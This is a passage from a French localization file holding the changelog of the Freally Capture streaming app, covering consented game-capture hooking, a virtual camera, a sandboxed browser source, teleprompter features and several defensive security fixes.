hookés, ce que couvre un test de bout en bout qui construit une vraie swap chain en modèle flip, présente uniquement via <code>Present1</code> et relit l'image capturée.","changelog.77d8a35def9c":"<strong>La perte du périphérique est gérée.</strong> La texture partagée mémorise le périphérique qui l'a créée : un TDR ou un alt-tab hors du plein écran exclusif provoque une reconstruction au lieu d'une copie entre deux périphériques.","changelog.b122bc48cff9":"<strong>Plusieurs swap chains ne font plus s'emballer la texture partagée</strong> à chaque présentation (une fenêtre de lanceur, une vue d'éditeur ou un écran de démarrage forçait auparavant une reconstruction en pleine résolution plus de 60 fois par seconde) ; c'est la première chaîne qui est retenue.","changelog.fda7f3673f30":"<strong>Les back buffers multiéchantillonnés sont résolus</strong> au lieu de faire échouer <code>CopyResource</code> en silence.","changelog.b3bac7144e62":"<strong>La vtable est réellement restaurée au déchargement</strong> — explicitement depuis <code>DLL_PROCESS_DETACH</code>, et seulement si les emplacements contiennent encore nos fonctions, afin qu'un overlay qui a posé son hook après nous ne soit jamais décroché en silence. (L'affirmation précédente selon laquelle le <code>Drop</code> de <code>HookState</code> s'en chargeait était fausse : Rust n'exécute jamais le drop des variables statiques.)","changelog.27986d7f86bc":"<strong>Un titre D3D12 échoue désormais vite et honnêtement</strong> au lieu d'épuiser le délai d'attente de la première image, et la DLL injectée n'écrit plus sur stderr — un jeu du sous-système GUI n'a pas de handle stderr, et avec <code>panic = &quot;abort&quot;</code> une écriture ratée faisait planter le <em>jeu</em>.","changelog.dd55e1058c26":"Le thread de rendu du jeu ne subit plus une attente de 4 ms sur le mutex à clé à chaque présentation.","changelog.3f346cd6bbf4":"Corrigé — enfin accessibles","changelog.ef07cd87f669":"<strong>La source navigateur figure dans le menu Ajouter.</strong> Elle était livrée complète dans 1.2.0, mais derrière un indicateur désactivé, et le menu disait encore aux opérateurs d'utiliser plutôt la Capture de fenêtre.","changelog.3ff4af9be26b":"<strong>La caméra virtuelle peut être démarrée.</strong> Le backend était complet mais rien ne l'appelait : il n'existait aucune commande de démarrage ou d'arrêt et le bouton était désactivé en dur. Elle est désormais câblée de bout en bout, en se branchant sur la relecture du programme <em>existante</em>, si bien que l'activer ne coûte qu'une publication de plus par image déjà lue. Toujours non signée, et toujours en attente d'un vrai test dans Zoom/Meet/Teams.","changelog.01041cd1674e":"Modifié — performances","changelog.ae778ae72eb2":"Quatre chemins de décodage copiaient l'image entière à chaque image ; le compositeur détruisait et reconstruisait chaque texture de chaîne de filtres 60×/s (le cache était élagué à chaque composition, mais la composition s'exécute pour le programme, l'aperçu, le canevas vertical, les scènes imbriquées, les vignettes, les projecteurs et les deux moitiés d'une transition) ; l'enregistrement <code>.frec</code> faisait un appel système par image et copiait 8 MB avant la soustraction ; FLZ allouait une table de 64 KiB par tranche et le décodeur allouait un tampon qu'il recopiait aussitôt ailleurs ; <code>sanitize</code> était quadratique à chaque chargement et à chaque import ; la boîte aux lettres de capture libérait une image de 8 MB à l'intérieur du verrou qu'attend son consommateur.","changelog.8800583b308d":"<strong>Les nombres dénormalisés audio sont ramenés à zéro.</strong> Avec <code>forbid(unsafe_code)</code>, le bit flush-to-zero du registre MXCSR est inaccessible : les tranches coupées décroissaient donc jusque dans la plage des dénormalisés et y restaient, ce qui coûtait 10 à 100× plus par échantillon.","changelog.70947783a47e":"Ajouté — robustesse et outillage","changelog.cc7a8bef1645":"<strong>Une error boundary React</strong>, branchée dans les deux enveloppes partagées (<code>PickerShell</code>, importé par 59 fichiers, et <code>Panel</code>). Une exception pendant le rendu démontait auparavant tout le studio pendant que le côté Rust continuait d'encoder et de diffuser — pas hors antenne, mais aveugle et incapable de s'arrêter. Une boîte de dialogue qui plante garde désormais son bouton de fermeture.","changelog.c7dc2964a7e9":"<strong>Deux tests de fumée visuels réussissaient sur un écran vide.</strong> <code>11-recordings</code> et <code>19-profiles</code> pesaient tous deux exactement 4 255 octets : le mock ne définissait pas les commandes que lisent ces boîtes de dialogue, l'application se démontait, et la boucle ne vérifiait rien. Le mock a gagné 16 commandes et un jeu complet de réglages de test, et la boucle vérifie désormais que la boîte de dialogue est réellement visible.","changelog.e020b3ffc504":"<strong>Fuzzing.</strong> Des balayages déterministes d'entrées malformées pour le décompresseur <code>.frec</code> et l'analyseur d'identifiants de capture s'exécutent dans la suite normale sur les trois systèmes, plus un harnais <code>cargo-fuzz</code> — 77 625 230 exécutions contre <code>flz::decompress_into</code>, sans aucun plantage.","changelog.f52e2bae0c8f":"<code>docs/local-security-tooling.md</code> recense les scanners exclusivement locaux qui ont été exécutés (Semgrep : 0 résultat ; Trivy : 0 secret, 0 vulnérabilité élevée ou critique) et explique, honnêtement, pourquoi Miri ne vaut <em>pas</em> la peine d'être ajouté ici : les douze crates de bibliothèque appliquent déjà <code>deny(unsafe_code)</code>, et le code unsafe restant relève du FFI, que Miri ne peut pas exécuter.","changelog.30ae102eb166":"<span class=\"release__meta\"><span class=\"release__ver\">v1.2.0</span><time class=\"release__date\" datetime=\"2026-08-19\">2026-08-19</time></span><span class=\"release__title\">(Capture avancée et web)</span>","changelog.c240db164d51":"<strong>Les trois derniers ajouts à l'application.</strong> La caméra virtuelle, une vraie source navigateur et la capture de jeu via un hook de présentation GPU injecté. Les trois arrivent d'abord sous Windows, la situation de chaque système étant exposée honnêtement plutôt que maquillée. Deux d'entre eux livrent des composants qui ne sont <strong>pas encore signés</strong>, et les tests en conditions réelles (la caméra visible dans une application de visioconférence ; l'injection dans un titre protégé) restent à faire — les deux points sont signalés dans les notes ci-dessous au lieu d'être passés sous silence.","changelog.6b02e0d363a4":"Ajouté","changelog.15c7060f73c9":"<strong>Capture de jeu via un hook de présentation GPU injecté (CAP-N78, Windows).</strong> Un jeu peut désormais être capturé par le <code>Present</code> de sa propre swap chain — pour les titres en plein écran exclusif que la capture de fenêtre WGC ne peut pas atteindre, à la cadence de présentation native du jeu. C'est <strong>strictement sur accord explicite, jeu par jeu</strong> : rien n'est injecté tant que vous n'avez pas accepté le risque anti-triche/antivirus, exposé sans détour, pour ce jeu précis (un <code>Consent</code> limité à un seul exécutable, créé uniquement à partir d'une acceptation explicite — il ne peut jamais être rejoué contre un autre jeu), et un titre qui refuse le hook se rabat sur la Capture de fenêtre existante avec un message honnête, jamais avec un plantage. Sources ▸ Capture de jeu (à lire d'abord) → accepter → choisir le jeu. La DLL du hook ne modifie que la vtable DXGI, copie chaque back buffer dans une texture partagée à mutex à clé et restaure la vtable au déchargement ; une image occupée est sautée pour que le jeu ne soit jamais ralenti par nous. Les back buffers HDR sont envoyés vers WGC (dont le compositeur du bureau assure le mappage de tons) plutôt que d'être lus à tort comme du 8 bits. Nouvelle crate <code>freally-game-hook</code> ; protocole décrit dans <code>design/game-hook-protocol.md</code>.","changelog.8a03cfb2c221":"<strong>Caméra virtuelle (CAP-N76, Windows).</strong> Le programme composé alimente une « Freally Capture Virtual Camera » via un transport en mémoire partagée à double tampon sans verrou (<code>fcap_stream::vcam::transport</code>) et le cycle de vie Media Foundation <code>MFCreateVirtualCamera</code> (<code>fcap-vcam-win</code>), qui détruit le périphérique à l'arrêt <em>et</em> à la libération, afin qu'aucune caméra zombie ne subsiste. La source enregistrée auprès du frame server est une vraie DLL COM <code>IMFMediaSource</code> (<code>freally-vcam-source</code>) qui s'enregistre elle-même pour l'utilisateur courant (sans droits d'administrateur) et sert les images de l'application sous forme de flux RGB32 — le même modèle de composant à la demande et vérifié par hachage que les ponts ffmpeg/CEF. <code>virtual_camera_status</code> communique à l'interface la disponibilité réelle ; la caméra fonctionne sans signature pour l'utilisateur courant, la signature du code étant la seule étape réservée à la publication. macOS (CoreMediaIO) et Linux (v4l2loopback) font l'objet de composants distincts.","changelog.7f566bdedc82":"<strong>Vraie source navigateur — backend CEF OSR (CAP-N77).</strong> Une page http/https quelconque est rendue hors écran par CEF à la résolution et à la cadence choisies, puis transmise au compositeur sous forme de <code>FBH1</code> + images de taille fixe. Le backend (<code>crates/browser-host --features cef</code>) se lie à libcef depuis le composant CEF épinglé et vérifié par hachage, et soumet <strong>chaque</strong> navigation à la liste d'autorisation partagée (une redirection vers <code>file://</code>/<code>javascript:</code> est annulée, jamais suivie). Vérifié de bout en bout sous Windows : une URL réelle produit de vraies images, avec un arrêt propre sur EOF de stdin. L'environnement d'exécution n'est téléchargé qu'à la première utilisation (jamais intégré) ; la signature du code pour chaque système est la dernière étape avant publication.","changelog.8f6fb4eb7f42":"Sécurité","changelog.2e30d476c4fe":"<strong>La source navigateur active désormais le bac à sable du moteur de rendu de Chromium sous Windows.</strong> L'hôte affiche des pages web arbitraires, et l'une d'elles peut provenir d'une collection de scènes importée ; il démarrait pourtant Chromium avec le bac à sable désactivé — le seul contrôle qui empêche une page compromise de se transformer en exécution de code avec vos droits. Sous Windows, il tourne désormais dans le bac à sable. macOS et Linux restent pour l'instant sans bac à sable (celui de Linux nécessite un assistant privilégié que le composant ne fournit pas encore), ce que le code indique explicitement au lieu de laisser croire à un choix délibéré.","changelog.17f0a576df73":"<strong>Le consentement à la capture de jeu ne voyage plus dans une collection de scènes.</strong> Une collection est un document partageable — un <code>.fcappack</code>, un import OBS, un instantané, un fichier modifié à la main — elle ne doit donc jamais pouvoir porter l'autorisation d'injecter une DLL dans un autre processus. C'était pourtant possible : l'indicateur « J'accepte le risque anti-triche » était un champ du document, et un pack reçu dont la source Capture de jeu désignait un exécutable quelconque s'y injectait dès l'import, sans demande et sans que le texte d'avertissement soit jamais affiché. Le chargement d'une collection efface désormais toujours cet indicateur (couvert par un test de non-régression) : une disposition importée se rabat ainsi sur une simple Capture de fenêtre jusqu'à ce que l'opérateur donne de nouveau son accord dans le sélecteur — le seul endroit où l'avertissement est réellement affiché.","changelog.5d0d9a1170f9":"<strong>Le consentement est désormais lié à l'exécutable que l'utilisateur a réellement approuvé.</strong> Il était créé à partir de l'exécutable résolu au démarrage puis vérifié contre cette même chaîne, si bien que la vérification ne pouvait jamais échouer et que la garantie documentée « le consentement pour <code>game-a.exe</code> ne peut jamais être rejoué contre <code>game-b.exe</code> » n'existait pas à l'exécution. Le consentement est désormais accordé pour le programme enregistré au moment où la source a été choisie et vérifié contre celui vers lequel la fenêtre se résout à présent : une source qui se rattache à un autre processus est refusée plutôt qu'injectée.","changelog.4118fb4fed0e":"Supprimé","changelog.a76a693b9e23":"<strong>Intégration de Freally Central (« Plus d'applications Freally »).</strong> Freally Central n'existe plus : le sous-module embarqué <code>vendor/freally-central</code> et tout ce qui en dépendait ont donc disparu — la dépendance à la crate <code>freally-central-engine</code> et ses sept commandes Tauri <code>central_*</code>, l'élément de menu <strong>Aide → Plus d'applications Freally</strong> et sa boîte de dialogue, le pont de thème <code>fcp-*</code> du panneau, les alias tsconfig/vite <code>@freally/central-panel</code>, et les catalogues de langue <code>fcp-*</code> embarqués qui étaient superposés dans chaque bundle. Capture ne dépend plus d'un dépôt disparu — un clone neuf et une extraction en CI réussissent désormais là où le sous-module manquant les aurait fait échouer.","changelog.1246fc93bca0":"Corrigé","changelog.3e3cbc39c891":"<strong>L'hôte navigateur est désormais arrêté proprement au lieu d'être tué d'office.</strong> Il était lancé avec son stdin sur <code>/dev/null</code>, ce qui rendait impossible l'envoi du signal « stdin fermé → sortie 0 » documenté par le protocole : chaque arrêt était donc une terminaison brutale, qui laissait orphelins les sous-processus de rendu et GPU de CEF. Son stdin est désormais un vrai pipe, et sa fermeture laisse à l'hôte un délai de grâce borné (500 ms) pour quitter de lui-même avant d'être tué. La borne est voulue : <code>stop()</code> attend la fin de la pompe, ce code se trouve donc sur le chemin de réconciliation du studio et ne doit jamais bloquer un changement de scène.","changelog.158d17057e90":"<strong>Le téléchargeur de l'environnement CEF est épinglé sur la branche avec laquelle l'hôte est compilé.</strong> Il prenait auparavant ce que <code>index.json</code> désignait comme le plus récent. CEF n'offre aucune stabilité d'ABI d'une version majeure à l'autre et l'hôte refuse un environnement avec lequel il n'a pas été compilé : « le plus récent » pouvait donc coûter un téléchargement d'environ 100 MB pour aboutir à une source Navigateur dans une impasse. C'est désormais la build <code>minimal</code> stable la plus récente <em>au sein de</em> la version majeure épinglée qui l'emporte, ce qui récupère toujours les correctifs de sécurité de Chromium au sein de cette branche.","changelog.7416b5a9ae50":"<strong>La règle « http/https uniquement » couvre désormais les redirections, et plus seulement l'URL initiale.</strong> Une page servie en http pouvait rediriger — 302, <code>location.href</code>, <code>window.open</code>, un sous-cadre — vers <code>file://</code> et lire des fichiers locaux, ou vers <code>javascript:</code>/<code>data:</code> pour exécuter un script que l'opérateur n'avait jamais choisi. La liste d'autorisation est un point de contrôle unique et testé (<code>is_allowed_url</code>) que le backend CEF est désormais tenu d'appeler depuis son gestionnaire de navigation, si bien que la règle sur les arguments et celle sur les redirections ne peuvent pas diverger.","changelog.d70c33477501":"<strong>Le bandeau de composant du sélecteur Navigateur suit l'installation au lieu de rester figé à l'ouverture.</strong> Il lisait l'état de l'environnement une seule fois au montage, si bien qu'une installation lancée depuis Outils → Composants pendant que le sélecteur était ouvert le laissait affirmer que le composant manquait. Il s'abonne désormais à l'événement <code>cef</code> et distingue les quatre états : non installé, une installation déjà en cours, une installation qui a échoué (avec sa raison), et une plateforme pour laquelle CEF ne publie aucune build — où « installez-le depuis Composants » était un conseil qui ne pouvait jamais aboutir.","changelog.de0da2df5676":"<strong>La jonction du backend CEF de l'hôte navigateur passe au linter en CI.</strong> <code>--features cef</code> n'est compilé que par le jalon du composant ; ce code avait donc dérivé jusqu'à échouer à <code>clippy -D warnings</code>, ce qui aurait cassé cette compilation dès sa première exécution. La CI passe désormais cette jonction au linter à chaque push.","changelog.63e7bdb09d63":"<strong>La capture de jeu survit à un redimensionnement ou à un alt-tab.</strong> Le handle nommé de la texture partagée du producteur était créé puis aussitôt abandonné, si bien que le nom restait enregistré pendant toute la durée de vie du processus du jeu. Chaque changement de géométrie tentait alors de recréer la texture sous un nom qui existait encore, échouait avec <code>DXGI_ERROR_NAME_ALREADY_EXISTS</code>, et la capture mourait définitivement sans que rien ne soit signalé. Le handle est désormais conservé puis fermé, et l'ancienne texture est libérée avant la construction de la nouvelle.","changelog.0a3b42e6c8d3":"<strong>Le premier ajout d'une Capture de jeu ne se rabat plus en silence sur la Capture de fenêtre.</strong> L'injection rend la main dès que le <code>LoadLibraryW</code> distant revient, mais <code>DllMain</code> ne fait que <em>lancer</em> le thread d'armement — le bloc de contrôle n'existe pas tant que ce thread n'a pas construit un périphérique et une swap chain factice. L'application s'y rattachait immédiatement et perdait toujours cette course. Elle attend désormais (avec une limite) que le hook soit réellement armé.","changelog.b97f30288a77":"<strong>Un jeu hooké qui se ferme libère la source.</strong> <code>FLAG_PRODUCER_ALIVE</code> n'est jamais effacé — un jeu tué ou qui plante n'exécute jamais <code>DLL_PROCESS_DETACH</code> — si bien que le dernier bloc de contrôle survivait avec l'indicateur levé et que la pompe tournait indéfiniment sur la dernière image, sans jamais se fermer ni déclencher la récupération automatique. L'application demande désormais au système si le jeu tourne encore.","changelog.8f6e3e5d64ef":"<strong>Un jeu lent à charger le hook ne risque plus de planter.</strong> À l'expiration du délai d'injection, la page distante était libérée alors que le <code>LoadLibraryW</code> du jeu pouvait encore la lire. La page n'est désormais libérée qu'une fois que ce thread s'est terminé de façon avérée.","changelog.76d466ce9bcf":"<strong>Un armement raté peut être retenté.</strong> Si le mappage du bloc de contrôle échouait, l'indicateur « installé » restait levé, et le processus demeurait à jamais à moitié armé : injecté, sans rien publier et incapable de se rétablir. L'état du hook est aussi publié <em>avant</em> la modification de l'emplacement de la vtable — une présentation survenant entre les deux ne trouvait aucun état et renvoyait <code>S_OK</code> sans enchaîner sur le vrai <code>Present</code>, avalant en silence le flip de cette image.","changelog.1fdb03f5eeaf":"<strong>La DLL source de la caméra virtuelle ne peut plus être déchargée en cours d'utilisation.</strong> <code>DllCanUnloadNow</code> répondait <code>S_OK</code> sans condition — cet export <em>est</em> la manière dont COM pose la question — si bien qu'un <code>CoFreeUnusedLibraries</code> dans l'hôte du frame server pouvait la décharger alors qu'une application de visioconférence détenait encore la source média. Elle rapporte désormais un vrai décompte d'objets et de verrous serveur. <code>Shutdown</code> rompt aussi le cycle de références fortes source↔flux qui provoquait une fuite à chaque ouverture de la caméra.","changelog.686194fae62e":"<strong>Deux chaînes visibles par l'utilisateur contenaient des suites d'espaces parasites</strong> introduites par un retour à la ligne (l'erreur de Composants liée au CEF épinglé et l'infobulle de la caméra virtuelle hors Windows).","changelog.faf05b9b72f7":"<span class=\"release__meta\"><span class=\"release__ver\">v1.1.0</span><time class=\"release__date\" datetime=\"2026-07-20\">2026-07-20</time></span><span class=\"release__title\">(Capture avancée et web — Phase 10, premier volet)</span>","changelog.4eb7f2b2ea1d":"<strong>L'approfondissement d'après 1.0 commence.</strong> La phase 10 ouvre les trois chantiers de capture longtemps classés « jalon à part entière » — une caméra virtuelle, une vraie source navigateur et la capture de jeu — sous la forme d'un développement réellement planifié. Cette version livre la partie terminée et autonome : <strong>l'export automatique d'une copie partageable à l'arrêt (CAP-N75)</strong>, la fonctionnalité de la feuille de route due depuis le Build 12. Les environnements d'exécution de la source navigateur et de la caméra virtuelle sont des sous-jalons (signature, composants) qui arriveront dans des versions ultérieures ; rien n'est encore exposé à l'utilisateur à leur sujet. Toutes les nouveautés sont désactivées par défaut, restent locales et n'ajoutent aucun appel réseau.","changelog.f4bd0df9d9a9":"<strong>Export automatique d'un MP4 partageable à l'arrêt (CAP-N75)</strong> — une seule option dans <strong>Paramètres → Sortie</strong>, <em>« Enregistrer aussi un MP4 partageable à côté du master »</em> (affichée uniquement pour un enregistrement dans le format propre <code>.frec</code>, <strong>désactivée par défaut</strong>). Lorsqu'un enregistrement <code>.frec</code> est finalisé, un export en arrière-plan écrit à côté une copie MP4 lisible d'un double-clic — visible dans la file post-enregistrement de la boîte de dialogue Enregistrements — par le même chemin d'encodage que l'export manuel, avec un nommage qui évite les collisions. Le master <code>.frec</code> sans perte n'est jamais touché, et la copie est mise en file avant toute chaîne post-enregistrement, pour qu'une étape Déplacer vers un dossier ne puisse pas déplacer le master sous ses pieds. Gardez le master récupérable après un plantage <strong>et</strong> obtenez un fichier partageable sans effort.","changelog.8a7525b1492f":"Remarques","changelog.684a3421d35f":"Fondations posées (non exposées à l'utilisateur dans cette version) : la <strong>vraie source navigateur</strong> (CAP-N77) côté application et son architecture CEF à processus auxiliaire, ainsi que la jonction de transport de la <strong>caméra virtuelle</strong> — toutes deux attendent des environnements d'exécution signés, livrés comme composants dans des sous-jalons à part entière. Voir la phase 10 de la feuille de route.","changelog.1255703a672a":"<span class=\"release__meta\"><span class=\"release__ver\">v1.0.0</span><time class=\"release__date\" datetime=\"2026-07-19\">2026-07-19</time></span><span class=\"release__title\">(Stable — incrustations de production de stream et finitions de lancement)</span>","changelog.c682627010fd":"<strong>La version stable 1.0.0.</strong> Le seuil des 100 fonctionnalités comptées (26 indispensables CAP-M + 74 souhaitables CAP-N) a été atteint à 0.900.0 ; cette version livre les cinq fonctionnalités de finition mises de côté pour 1.0.0 — l'écran de compte à rebours d'avant-émission, une barre des réseaux sociaux, un bandeau de message de chat mis en avant, la profondeur de champ des fenêtres modales et le nettoyage de l'historique des scènes — ainsi qu'une série de correctifs pour le lecteur et l'audio. Toutes les nouveautés sont désactivées ou sans raccourci par défaut, restent locales et n'ajoutent aucun appel réseau.","changelog.13b71822377f":"<strong>Écran de compte à rebours « Bientôt en direct » (V1-C)</strong> — à un clic depuis Ajouter une source : un compte à rebours plein canevas (une légende au-dessus d'une grande horloge) qui décompte JUSQU'À une heure choisie sur un sélecteur d'horloge de 12 heures (heures 1–12, minutes par pas de 5 minutes, AM/PM). À zéro, il <strong>clignote et reste affiché</strong> — l'hôte le retire et passe en direct à la main, jamais par une bascule automatique. Arrière-plans : un dégradé à deux couleurs, une couleur unie, une image fixe (intégrée en entier, centrée, jamais rognée), ou un <strong>GIF ou une vidéo</strong> sur l'arrière-plan en boucle de la scène — avec une <strong>musique de fond</strong> facultative (mp3/wav/flac/m4a/aac/ogg/opus) choisie dans la même boîte de dialogue. Le compte à rebours est composité dans le programme : les spectateurs du stream ou de l'enregistrement le voient.","changelog.110b8b024a21":"<strong>Source Musique de fond</strong> — Ajouter une source → Musique de fond… : un ou plusieurs fichiers audio sous forme de playlist invisible en boucle (lecture aléatoire facultative), monitorée automatiquement pour être entendue dans l'aperçu et captée dans l'enregistrement et le stream ; son ajout coupe le son propre d'un arrière-plan vidéo, si bien qu'<strong>un seul son de fond est joué à la fois</strong>.","changelog.6c522580be6b":"<strong>Source barre des réseaux sociaux et chaînes (V1-D)</strong> — une incrustation générée qui liste vos identifiants : des lignes de plateformes intégrées (YouTube, Twitch, Kick, X, Instagram, TikTok, Facebook, Discord) sous forme de badges aux couleurs des marques, plus des lignes personnalisées et un en-tête facultatif ; chaque ligne et chaque identifiant se modifient dans Propriétés.","changelog.9d0f60a20a05":"<strong>Bandeau de message de chat mis en avant (V1-E)</strong> — choisissez n'importe quelle ligne de chat récente (parmi toutes les incrustations de chat actives) et épinglez-la au programme sous forme de bandeau stylisé en bas de l'image ; les couleurs sont conservées dans les Paramètres, l'épinglage lui-même est volontairement éphémère. Retiré en un clic.","changelog.18f4b83dbd99":"<strong>Profondeur de champ des fenêtres modales (V1-A)</strong> — chaque fenêtre modale floute et assombrit le studio derrière elle (selon le thème, en respectant les préférences de réduction des animations et de la transparence) ; les surfaces d'accompagnement comme le prompteur restent nettes pour que l'opérateur puisse continuer à lire.","changelog.501b690add0e":"<strong>Nettoyage de l'historique des scènes (V1-B)</strong> — une liste Scènes récentes avec un bouton <strong>Effacer l'historique…</strong> en un clic (avec confirmation), plus Collection de scènes → Effacer l'historique… pour supprimer en masse les collections superflues (la collection active n'est jamais touchée).","changelog.c993200abe94":"<strong>Couleurs classiques du visualiseur audio</strong> — une case à cocher dans Propriétés fait passer les barres et les vumètres à la rampe de diffusion classique vert→jaune→rouge (l'oscilloscope passe au vert phosphore) ; décochée, c'est la couleur unie unique.","changelog.2581bdff5166":"<strong>Enregistrer une répétition</strong> — démarrer une répétition propose désormais de l'enregistrer aussi dans un fichier vidéo normal (uniquement si rien n'est déjà en cours d'enregistrement ; l'enregistrement s'arrête avec la répétition), pour qu'un filage puisse devenir un master à monter et à mettre en ligne sans jamais passer en direct.","changelog.3d3a4c1d8909":"<strong>La Playlist média n'avait pas de tranche dans la console</strong> — la liste des types audio de l'interface ne contenait pas <code>playlist</code> (ni <code>replayPlayback</code>), si bien que les playlists ne pouvaient être ni réglées au fader, ni coupées, ni monitorées ; les deux ont désormais leur tranche.","changelog.5a87688dfb99":"<strong>Affichage d'une playlist audio seule</strong> — elle montre désormais <strong>le nom de la piste en cours</strong> (texte propre, sans boîte de glyphe cassée) ; les playlists de musique de fond n'affichent rien du tout. Les playlists vidéo sont inchangées.","changelog.7f672b15fac6":"<strong>Cadrage du compte à rebours et des arrière-plans</strong> — les arrière-plans image, GIF et vidéo sont affichés en entier (avec des bandes) et centrés au lieu d'être rognés pour remplir le cadre, de sorte que l'image entière est toujours visible.","changelog.fb60af02a1ed":"<strong>Série de revues (avant publication)</strong> — la passe de sécurité a relevé un problème de gravité HAUTE : le chemin de l'image de l'écran de compte à rebours était lu dans la boucle de rendu sans la protection des chemins réseau dont dispose chaque chemin équivalent (un chemin UNC aurait divulgué le hachage NTLM à une collection de scènes malveillante) — il est désormais refusé d'emblée. La revue de code en a relevé 11 autres, tous corrigés : une panique de la boucle de rendu sur les canevas de moins de 240 px de large, un indicateur d'enregistrement de répétition périmé qui pouvait arrêter un enregistrement lancé à la main par l'utilisateur, la liste Scènes récentes qui affichait la scène déjà au programme (et l'annulation/le rétablissement qui modifiaient cette liste propre à la session), des changements de couleur du bandeau qui ne redessinaient pas un bandeau déjà épinglé, le sélecteur d'horloge qui arrondissait en silence d'anciennes cibles non alignées sur 5 minutes, une image d'écran en échec retentée (et journalisée) chaque seconde, un PNG transparent rendu opaque sur l'écran, et diverses duplications désormais mises en commun (une seule liste d'extensions audio, un seul sélecteur d'horloge, une seule routine de dessin de rectangles arrondis).","changelog.c5d49f26f5b2":"<span class=\"release__meta\"><span class=\"release__ver\">v0.910.0</span><time class=\"release__date\" datetime=\"2026-07-19\">2026-07-19</time></span><span class=\"release__title\">(Refonte du prompteur)</span>","changelog.f500d8210c1a":"<em>Le prompteur gagne en maturité.</em> Une refonte ciblée du prompteur livré dans 0.800.0 : les pauses deviennent de vrais objets qu'une fausse manœuvre ne peut plus abîmer, le défilement peut suivre le tempo d'un morceau, un décompte facultatif donne le départ au présentateur, le projecteur rend la fenêtre principale à l'opérateur, et le script peut se lire à voix haute ou compléter vos mots pendant la saisie. Toutes les nouveautés sont locales et désactivées ou neutres par défaut — les dictionnaires d'autocomplétion sont de simples fichiers de données locaux (chargés à la demande, une langue à la fois) et la lecture à voix haute passe par le moteur vocal du système d'exploitation lui-même ; rien n'est intégré et rien n'est téléchargé.","changelog.fd0ed8487a73":"<strong>Pastilles de pause (césures)</strong> — une pause en ligne écrite <code> -- </code> (un temps) ou <code> --N </code> (un arrêt de N secondes) s'affiche désormais dans l'éditeur de script comme une seule pastille atomique : le curseur ne peut pas s'y placer, une seule pression sur <strong>Delete/Backspace</strong> supprime le jeton entier (jamais un tiret orphelin), et le copier-coller conserve le marqueur intact. Une pause se lit et se modifie comme un seul objet au lieu de quatre caractères épars.","changelog.29694897048a":"<strong>Démarrer le compte à rebours</strong> — un décompte <strong>3-2-1</strong> facultatif avant le début du défilement, affiché à la fois dans l'aperçu de l'opérateur et sur le projecteur du présentateur, pour que le lecteur ait le temps de reprendre son souffle avant que le texte ne bouge.","changelog.645e73577cff":"<strong>Mode BPM</strong> — réglez la vitesse du défilement en <strong>battements par minute (50–250)</strong> plutôt qu'en caractères par seconde, pour lire des paroles en rythme avec la musique. Changez de mode librement ; un changement ajuste <strong>en direct</strong> le défilement en cours.","changelog.a1ef18efc830":"<strong>De vraies icônes de transport</strong> — le projecteur et le panneau de l'opérateur disposent désormais de véritables commandes <strong>SVG</strong> lecture / pause / arrêt / retour rapide / avance rapide / redémarrage à la place des glyphes provisoires.","changelog.ccfc933d79f9":"<strong>Le projecteur libère la fenêtre principale</strong> — ouvrir le projecteur du présentateur <strong>ferme désormais la fenêtre modale de l'opérateur</strong>, pour que vous puissiez piloter votre direct depuis la fenêtre principale pendant que le présentateur lit. Avec un compte à rebours de départ armé, le projecteur <strong>revient automatiquement au début, décompte, puis lance la lecture depuis le début</strong> à l'ouverture — une seule action remet le lecteur à zéro et lance le défilement.","changelog.90ca5a72ccb0":"<strong>Lecture à voix haute</strong> — écoutez un script grâce à la <strong>synthèse vocale propre</strong> au système d'exploitation — Windows <strong>SAPI 5 / OneCore</strong>, macOS <strong>AVSpeechSynthesis</strong>, et sous Linux la Web Speech API ou, à défaut, <strong><code>spd-say</code> / <code>espeak-ng</code></strong> s'ils sont installés. Aucun moteur TTS n'est intégré ; la voix du système est utilisée telle quelle. Voir <code>THIRD-PARTY.md</code>.","changelog.5689e3adcf62":"<strong>Autocomplétion en texte fantôme</strong> — des suggestions de mots et d'expressions en gris clair apparaissent dans le texte pendant la saisie et s'acceptent avec <strong>Tab</strong>. Chacune des <strong>18 langues de l'application</strong> a son propre dictionnaire, chargé à la demande uniquement pour la langue dans laquelle vous écrivez. Les sources des dictionnaires et leurs licences <strong>CC-BY / permissives</strong> (Tatoeba, SCOWL, Leipzig Corpora, OpenTaal, …) sont listées dans <code>THIRD-PARTY.md</code>.","changelog.f1248a45cf83":"<strong>Retours à la ligne identiques entre aperçu et projecteur</strong> — les lignes se coupent désormais exactement aux mêmes endroits dans l'aperçu de l'opérateur et sur le projecteur plein écran, de sorte que la ligne que vous repérez est celle que lit le présentateur. Le projecteur affiche le script sur une scène de taille fixe, mise à l'échelle de l'écran en CSS : un saut de ligne ne peut plus tomber à un autre endroit sur le grand écran.","changelog.33a14cdb624d":"<strong>Temps écoulé de la barre de progression</strong> — l'affichage du temps écoulé ne grimpe plus <strong>au-delà</strong> de la durée totale de lecture ; il s'arrête à la fin au lieu de compter indéfiniment une fois le script entièrement défilé.","changelog.a757a5cd6973":"<strong>Aucune nouvelle dépendance d'exécution intégrée et aucun nouvel appel réseau.</strong> Les dictionnaires d'autocomplétion sont des données JSON locales (un fichier par langue, chargé à la demande pour la langue active), et la lecture à voix haute pilote le moteur vocal déjà présent sur la machine — rien n'est téléchargé à l'exécution. Les attributions des données et des moteurs vocaux figurent dans <code>THIRD-PARTY.md</code>. Chaque nouvelle commande et chaque nouveau mode sont traduits dans les 18 langues.","changelog.6c151934cc4a":"<span class=\"release__meta\"><span class=\"release__ver\">v0.900.0</span><time class=\"release__date\" datetime=\"2026-07-18\">2026-07-18</time></span><span class=\"release__title\">(Gestion du studio et flux de travail — Phase 8)</span>","changelog.db7b34e4b837":"<em>Votre studio vous appartient.</em> La phase 8 rend toute une disposition portable et partageable, ajoute la gestion de versions de vos scènes, place vos actions les plus utilisées à une touche de distance, et ouvre la personnalisation complète des thèmes ainsi qu'un mode portable sur clé USB. Tout est strictement local — aucune nouvelle dépendance et aucun nouvel appel réseau.","changelog.197ef0e08085":"<strong>Pack de collection de scènes — export/import (CAP-N60)</strong> — regroupez une disposition entière (le graphe de scènes et ses ressources locales : images, médias, LUT, masques, polices) dans un seul <code>.fcappack</code> portable et partagez-la en un seul fichier. L'import relie les ressources sur la machine cible ; les chemins URL/UNC sont consignés comme <em>externes</em> et ne sont jamais sondés ; les polices sont signalées pour l'attribution. Pas de place de marché, pas de serveur.","changelog.1993c99e5fa2":"<strong>Comparaison et fusion de collections de scènes (CAP-N61)</strong> — comparez la collection active à une autre collection, à un <code>.fcappack</code> ou à un instantané ; voyez les scènes et les sources ajoutées / supprimées / modifiées, ainsi que la transformation / les filtres / 